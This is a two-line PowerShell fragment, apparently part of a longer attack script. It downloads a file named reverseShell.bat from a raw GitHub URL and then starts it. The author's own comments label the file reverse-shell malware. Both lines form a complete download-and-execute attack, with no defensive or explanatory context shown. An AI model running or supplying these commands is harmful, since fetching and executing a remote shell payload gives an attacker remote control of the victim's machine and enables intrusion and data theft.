...
Invoke-WebRequest https://raw.githubusercontent.com/p1mpus/script/main/reverseShell.bat -o reverseShell.bat #Download the reverseShell malware
Start-Process reverseShell.bat #Start the malware
